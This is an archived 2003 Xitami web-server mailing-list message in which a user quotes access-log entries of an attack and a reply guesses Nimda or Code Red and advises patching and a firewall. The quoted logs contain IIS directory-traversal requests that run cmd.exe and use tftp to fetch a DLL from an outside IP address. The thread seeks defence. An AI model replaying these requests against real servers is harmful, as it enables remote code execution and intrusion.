@@ -1,0 +1,140 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Security Issue - Disabling Script Processing
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="004629.html">
+   <LINK REL="Next"  HREF="004614.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Security Issue - Disabling Script Processing
+   </H1>
+    <B>carlos
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Security Issue - Disabling Script Processing">xitami@lists.xitami.org
+       </A><BR>
+    <I>Tue, 14 Jan 2003 15:26:36 -0800</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="004629.html">Re[2]: [Xitami] Security Issue - Disabling Script Processing
+</A></li>
+        <LI> Next message: <A HREF="004614.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4625">[ date ]</a>
+              <a href="thread.html#4625">[ thread ]</a>
+              <a href="subject.html#4625">[ subject ]</a>
+              <a href="author.html#4625">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>You are in  trouble.
+This looks like a Nimda or codered attack.
+It attaks a range of ip´s, and when at last find some with the pants down it
+tries to exploit a security &quot;crater&quot; in MS systems.
+Download the latest updates from msupdate.
+
+Then install a descent firewall, at least zonealarm.
+
+If you succeed patching the holes then the logs should tell 404 not 200.
+
+Good luck:
+
+Carlos
+
+Ps: more info is available at ms website.
+
+----- Original Message -----
+From: &quot;Rob @ BMM&quot; &lt;<A HREF="mailto:Rob@bluemarblemeds.com">Rob@bluemarblemeds.com</A>&gt;
+To: &lt;<A HREF="mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A>&gt;
+Sent: Tuesday, January 14, 2003 9:40 AM
+Subject: [Xitami] Security Issue - Disabling Script Processing
+
+
+&gt;<i> Hi,
+</I>&gt;<i>
+</I>&gt;<i> Please forgive me if I have not sent this correctly to the group.
+</I>&gt;<i>
+</I>&gt;<i> Can somebody help me with this.
+</I>&gt;<i>
+</I>&gt;<i> Periodically, I see in the access logs and error logs, an attempt from a
+</I>&gt;<i> hacker to run certain types of scripts in a cmd window such as the
+</I>&gt;<i> following:
+</I>&gt;<i>
+</I>&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+&gt;<i> ET%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+&gt;<i> ET%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20G
+&gt;<i> ET%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET /scripts/..%%35%63../httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0&quot; 200 -1 &quot;&quot;
+</I>&quot;&quot;
+&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+&gt;<i> %20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+&gt;<i> %20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i> &quot;GET
+</I>&gt;<i>
+</I>/scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20208.179.58.54%20GET
+&gt;<i> %20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+</I>&gt;<i>
+</I>&gt;<i> Notice that the hacker successfully used tftp to send some info back to
+</I>&gt;<i> himself.  My router logs confirmed that this occurred.  I have since
+</I>&gt;<i> eliminated all access rights to tftp.  Not even the admin has rights
+</I>&gt;<i> anymore.  Since this is on a Win2k system, you just can't delete or rename
+</I>&gt;<i> certain system executables such as cmd.exe or tftp.exe.  Windows just
+</I>&gt;<i> restores it automatically.
+</I>&gt;<i>
+</I>&gt;<i> The question is: Since I run a simple HTML only site and don't need CGI
+</I>&gt;<i> processing, what can I do to eliminate all script processing of this
+</I>nature.
+&gt;<i>
+</I>&gt;<i> PS - The rest of you probably encounter some of these same security
+</I>issues.
+&gt;<i> You should check.
+</I>&gt;<i>
+</I>&gt;<i> Best Regards,
+</I>&gt;<i> Rob Allen
+</I>&gt;<i> President, Blue Marble Meds LLC.  Offering 30-75% off Prescription Meds
+</I>&gt;<i> See us at <A HREF="http://www.BlueMarbleMeds.com">http://www.BlueMarbleMeds.com</A>
+</I>&gt;<i>
+</I>&gt;<i>
+</I>&gt;<i>
+</I>&gt;<i> --
+</I>&gt;<i> Xitami Users Mailing List -- For Xitami support
+</I>&gt;<i> To unsubscribe: <A HREF="http://lists.xitami.org/mailman/listinfo/xitami">http://lists.xitami.org/mailman/listinfo/xitami</A>
+</I>
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="004629.html">Re[2]: [Xitami] Security Issue - Disabling Script Processing
+</A></li>
+	<LI> Next message: <A HREF="004614.html">[Xitami] Security Issue - Disabling Script Processing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4625">[ date ]</a>
+              <a href="thread.html#4625">[ thread ]</a>
+              <a href="subject.html#4625">[ subject ]</a>
+              <a href="author.html#4625">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
